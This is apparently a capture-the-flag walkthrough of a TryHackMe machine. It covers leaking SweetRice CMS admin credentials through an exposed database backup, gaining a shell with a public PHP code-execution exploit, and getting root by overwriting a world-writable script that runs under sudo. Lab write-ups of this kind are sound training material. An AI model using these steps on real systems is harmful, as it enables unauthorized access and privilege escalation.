## User Own
1. gobuster found `/content` page. It's a SweetRice CMS service.
2. According to the [docs](http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/), we found directory traversal at `/content/inc`.
3. Download `mysql_bakup_20191129023059-1.5.1.sql` from `/content/inc`. At the line 79 of the file, we found admin is `manager` and it's password is `Password123` in MD5.
4. Searching the exploits of SweetRice with `searchsploit, it shows that we can do a PHP code execution on the server. See `rev.html` to get shell.
5. Get flag at `/home/itguy/user.txt`.

## Root Own
1. We can run `perl /home/itguy/backup.pl` with sudo, and `backup.pl` will run `/etc/copy.sh`.
	```bash
	$ sudo -l
		Matching Defaults entries for www-data on THM-Chal:
			env_reset, mail_badpass,
			secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

		User www-data may run the following commands on THM-Chal:
			(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
	$ cat /home/itguy/backup.pl
	#!/usr/bin/perl

	system("sh", "/etc/copy.sh");
	```
2. Since `copy.sh` is writable to everyone, so we can execute commands as root via `copy.sh`.
	```bash
	$ ls -l /etc/copy.sh
	-rw-r--rwx 1 root root 28 Jun 16 14:18 /etc/copy.sh
	```
3. Get root.txt via `copy.sh`
	```bash
	$ echo 'cat /root/root.txt > /tmp/a' > /etc/copy.sh
	$ sudo perl /home/itguy/backup.pl
	$ cat /tmp/a
	THM{XXXXXXXXXXXXXXXXXXXX}
	```

